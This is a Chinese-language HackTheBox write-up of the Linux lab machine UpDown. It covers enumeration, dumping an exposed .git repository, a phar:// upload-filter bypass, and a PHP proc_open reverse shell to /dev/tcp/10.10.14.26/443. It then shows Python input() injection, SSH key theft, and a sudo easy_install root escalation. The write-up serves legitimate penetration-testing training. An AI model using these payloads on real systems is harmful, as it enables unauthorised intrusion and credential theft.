---
title: "UpDown"
description: "这篇HackTheBox Linux 靶机 UpDown 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 UpDown 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-24T04:21:00+08:00"
publishDate: "2024-10-24T04:21:00+08:00"
lastmod: "2024-10-24T04:21:00+08:00"
url: "/hackthebox/linux/updown/"
image: "images/oscp-banners/banner-009.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
sudo nmap -p- 10.10.11.177 -open
```

![image-20240907195434161](https://s2.loli.net/2024/09/07/35aTcVwDmA9JrRk.png)

```
sudo nmap -p22,80 -A 10.10.11.177 -oX updown.xml
```

![image-20240907195456928](https://files.seeusercontent.com/2026/04/06/oCk1/image-20240907195456928.png)

发现信息如下：

```
host:siteisup.htb

```

对路径进行扫描，没有特别有价值的内容只有一个dev目录，考虑针对子域进行扫描

```
ffuf -u http://siteisup.htb -H "Host:FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1131（忽略大小1131返回的无效数据）
```

![image-20240907204046286](https://s2.loli.net/2024/09/07/2WszYPcetkU6ZFI.png)

接着对以下两个继续进行扫描

http://dev.siteisup.htb/

http://siteisup.htb/dev/

![image-20240907204502056](https://s2.loli.net/2024/09/07/5Da9trVJZ1QodxY.png)

结果发现存在.git页面，考虑将对应的git内容进行下载，使用git-dumper进行下载

```
/home/zkpc/Tools/git-dumper/.venv/bin/git-dumper http://siteisup.htb/dev/.git .
```

![image-20240907211750024](https://s2.loli.net/2024/09/07/fhxMQHo2Bdqlev7.png)

查看了对应文件，怀疑这个.git内的文件为http://dev.siteisup.htb/的代码项目，而403无法访问的原因是在于特殊的http头

![image-20240907212024662](https://s2.loli.net/2024/09/07/F2BO3CuaX7cNevM.png)

在http头中添加

Special-Dev:  only4dev

在burp的proxy的setting中添加规则

![image-20240907213138208](https://s2.loli.net/2024/09/07/E8eVOk9XtTvNojY.png)

![image-20240907212235049](https://s2.loli.net/2024/09/07/H9YK1jmytEfDLS7.png)

查看应当为git内的对应页面，可以进行文件上传，查看源码，存在过滤

![image-20240907212431506](https://s2.loli.net/2024/09/07/yWhcJCRwIGmU5g3.png)

创建一个phpinfo读取，修改为jpeg格式上传

```
<?php phpinfo(); ?>
```

根据网上的搜索结果，使用phar://包装器用来读取文件内容

```
zip test.jpeg test.php
GET /?page=phar://uploads/23c939ac07df8e7732fcc8744d392333/test.jpeg/test
```

![image-20240907221639418](https://files.seeusercontent.com/2026/04/07/Hx9e/image-20240907221639418.png)

使用工具对phpinfo的危险开启项目进行检查

```
python2 dfunc-bypasser.py --file /home/zkpc/Documents/hackthebox/UpDown/phpinfo.php
```



![image-20240907222114119](https://s2.loli.net/2024/09/07/pvsldCJ7AnHcweB.png)

通过互联网查找proc_open危险开启的可以反弹shell的脚本

```
<?php
$descriptorspec = array(
  0 => array('pipe', 'r'), // stdin
  1 => array('pipe', 'w'), // stdout
  2 => array('pipe', 'a') // stderr
);
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.26/443 0>&1'";
$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
?>
```

```
GET /?page=phar://uploads/19fc9e5d472cf4884d7f2d43f7c501ba/shell.jpeg/shell 
```

![image-20240907223635710](https://s2.loli.net/2024/09/07/pGsJqtg2yUS1eKN.png)

成功获取反弹shell

![image-20240907223708204](https://s2.loli.net/2024/09/07/zvObPYGXZMwjLTe.png)

在home/developer/dev下发现两个文件，经过检查siteiup是执行文件，执行py脚本

![image-20240907224305674](https://files.seeusercontent.com/2026/04/07/1zmF/image-20240907224305674.png)

![image-20240907224316127](https://files.seeusercontent.com/2026/04/06/mBm0/image-20240907224316127.png)

python脚本存在input函数可以用来注入

```
./siteisup
__import__('os').system('bash')
```

![image-20240907224720890](https://files.seeusercontent.com/2026/04/07/rBw0/image-20240907224720890.png)

还是无法查看flag，到ssh目录下复制id_rsa

![image-20240907224916692](https://s2.loli.net/2024/09/07/ogfZVQFCd4RNmIz.png)

成功获取flag

运行sudo -l

![image-20240907225333793](https://s2.loli.net/2024/09/07/DTjVbauqpzFJAZd.png)

通过gtfobins查询

![image-20240907225356317](https://files.seeusercontent.com/2026/04/07/yN2g/image-20240907225356317.png)

```
cd /usr/local/bin
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

![image-20240907225530670](https://files.seeusercontent.com/2026/04/07/Q7an/image-20240907225530670.png)

成功

